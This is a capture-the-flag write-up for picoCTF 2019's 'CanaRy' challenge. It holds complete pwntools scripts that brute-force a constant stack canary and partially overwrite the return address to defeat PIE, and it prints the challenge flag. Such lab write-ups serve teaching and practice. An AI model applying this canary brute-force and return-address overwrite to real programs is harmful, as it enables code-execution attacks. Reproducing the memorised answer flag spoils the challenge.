# CanaRy

> This time we added a canary to detect buffer overflows. Can you still find a way to retreive the flag from this [program] (vuln) located in /problems/canary_5_f37171114d0d9fc71194842bb8b7bb34. [Source](vuln.c).

We are given the binary which is 32 bit binary and a source code.  
The program simply read `canary.txt` file then put its content in memory. This means the canary is constant and we can brute force it.

Upon disassembling the binary, I found out that our input will be stored at the address `ebp-0x30`, while the canary is in `ebp-0x10` which means we got 0x20 bytes of padding before we reach the canary.

```py
from pwn import *
LEN_CANARY = 4
canary = ""
context.log_level = 'error'
b = '/problems/canary_5_f37171114d0d9fc71194842bb8b7bb34/vuln'

# Brute canary
while len(canary) < LEN_CANARY:
    for i in [chr(x) for x in range(0x100)]:
        r = process(b)
        p = 'A'*0x20    
        p += canary
        p += i                                  # test whether this character gives us error or not

        length = len(p)
        r.recvuntil('> ')
        r.sendline(str(length))
        r.recvuntil('> ')
        r.send(p)
        t = r.recvline()

        r.close()
        if('Ok...' in t):                       # the character doesn't give us error which means our guess was correct
            print canary
            canary += i
            break
```

After we guess all the characters, we need to redirect program flow to call `display_flag` function. Unfortunately it seems that PIE is active :
```
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

```
pwndbg> x display_flag
0x7ed <display_flag>:   0x53e58955
```

We only know last 3 nible of the function, since this function address is most likely on the same page as the main function, we can assume that the leading 2 bytes are the same as main function so we only need to brute one byte.

```py
# Brute display_flag function address (we know last 3 nible of the address)
FLAG = ''
while FLAG == '':
    r = process(b)
    p = 'A'*0x20 + canary
    p += 'A'*(0x30-len(p))+'BBBB' # BBBB -> ebp
    p += '\xed\x97' # ASLR -> guessing
    r.recvuntil('> ')
    r.sendline(str(len(p)))
    r.recvuntil('> ')
    r.send(p)
    r.recvline()
    try:
        FLAG = r.recvline()
    except:
        pass
```

And finally this is the complete script
```py
from pwn import *
LEN_CANARY = 4
canary = ""
context.log_level = 'error'
b = '/problems/canary_5_f37171114d0d9fc71194842bb8b7bb34/vuln'

# Brute canary
while len(canary) < LEN_CANARY:
    for i in [chr(x) for x in range(0x100)]:
        r = process(b)
        p = 'A'*0x20
        p += canary
        p += i

        length = len(p)
        r.recvuntil('> ')
        r.sendline(str(length))
        r.recvuntil('> ')
        r.send(p)
        t = r.recvline()

        r.close()
        if('Ok...' in t):
            print canary
            canary += i
            break

# Brute display_flag function address (we know last 3 nible of the address)
FLAG = ''
while FLAG == '':
    r = process(b)
    p = 'A'*0x20 + canary
    p += 'A'*(0x30-len(p))+'BBBB' # BBBB -> ebp
    p += '\xed\x97' # ASLR -> guessing
    r.recvuntil('> ')
    r.sendline(str(len(p)))
    r.recvuntil('> ')
    r.send(p)
    r.recvline()
    try:
        FLAG = r.recvline()
    except:
        pass

print FLAG
```

Test on server:
```
an0nvi@pico-2019-shell1:/problems/canary_5_f37171114d0d9fc71194842bb8b7bb34$ python2 ~/asdf.py

l
lV
lV!
picoCTF{cAnAr135_mU5t_b3_r4nd0m!_2a16c6a0}
```

Flag: picoCTF{cAnAr135_mU5t_b3_r4nd0m!_2a16c6a0}